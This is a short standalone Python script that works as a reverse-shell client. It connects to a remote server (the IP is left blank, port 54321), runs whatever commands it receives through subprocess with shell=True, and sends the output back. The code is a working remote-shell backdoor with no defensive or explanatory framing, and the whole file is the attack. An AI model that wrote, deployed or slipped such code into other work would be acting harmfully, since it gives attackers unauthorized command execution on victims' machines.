import socket
import subprocess

# declaration of the socket
# see documentation
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connection to the server
ipaddress = ""
sock.connect((ipaddress, 54321))
print("Connection established to the server")

while True:
    command = sock.recv(1024)
    if command == "q":
        break
    else:
        # creation of the command, see documentation
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        result = proc.stdout.read() + proc.stderr.read()
        sock.send(result)


# close the socket
sock.close()
